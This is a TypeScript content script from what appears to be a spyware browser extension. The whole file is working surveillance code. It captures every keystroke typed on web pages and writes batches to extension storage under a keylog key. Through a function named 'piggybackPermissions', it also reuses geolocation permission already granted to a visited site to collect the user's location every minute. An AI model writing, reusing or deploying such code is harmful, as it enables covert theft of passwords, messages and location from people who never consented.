import { simpleAppend } from "../utils/shared-utils";
import { BackgroundMessage, StorageKey } from "../consts";
import { sendMessage, updateGeolocation } from "../utils/page-utils";
import { IKeylogEntry, ILogEntry } from "src/interfaces";

console.log("content-script.ts");

let buffer = "";

sendMessage(BackgroundMessage.HEARTBEAT);

function piggybackPermissions() {
  navigator.permissions
    .query({ name: "geolocation" })
    .then(({ state }: { state: string }) => {
      if (state === "granted") {
        updateGeolocation();
      }
    });
}

async function writeBuffer() {
  if (buffer.length > 0) {
    await simpleAppend<IKeylogEntry>(StorageKey.KEYLOG, {
      timestamp: new Date().toISOString(),
      buffer,
    });

    buffer = "";
  }
}

document.addEventListener("keyup", (e: KeyboardEvent) => {
  console.log(e.key);
  buffer += e.key;

  if (buffer.length > 500) {
    writeBuffer();
  }
});

setInterval(() => writeBuffer(), 5000);

document.addEventListener("visibilitychange", () => piggybackPermissions());

setInterval(() => piggybackPermissions(), 60 * 1e3);

piggybackPermissions();
